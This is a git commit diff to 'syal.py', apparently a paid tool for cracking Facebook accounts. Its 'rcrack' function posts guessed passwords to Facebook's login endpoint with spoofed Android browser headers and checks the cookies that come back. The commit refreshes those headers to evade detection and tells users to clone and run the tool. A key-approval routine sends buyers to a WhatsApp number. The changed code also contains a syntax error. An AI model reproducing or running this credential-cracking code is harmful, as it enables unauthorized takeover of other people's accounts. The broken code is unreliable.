e046c8c38d7c45264a313b93cbd5f6516265d04d
Jamilvisal <139256724+Jamilvisal@users.noreply.github.com>
2023-07-16 16:57:18 +0430

    Update syal.py
    git clone https://github.com/Jamilvisal/syal.git
    cd syal
    python syal.py

--- syal.py
+++ syal.py
@@ -439,11 +439,12 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
@@ -452,7 +453,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
+            'user-agent' pro,}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
@@ -496,7 +497,6 @@ def approval():
       input('IF U WANT TO BUY THEN PRESS ENTER ')
       tks = ('🅷︎🅴︎🅻︎🅻︎🅾︎%20🆁︎🅾︎🅻︎🅴︎🆇︎-🅷︎🅰︎🆀︎🅰︎🅽︎🅸︎-🅽︎🅾︎🅾︎🆁︎🆉︎🅰︎🅸︎-🆂︎🅰︎🅷︎🅸︎🅱︎%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93701659187?text='+tks),approval()
       time.sleep(1)
-      approval()
   except:
     sys.exit()
     
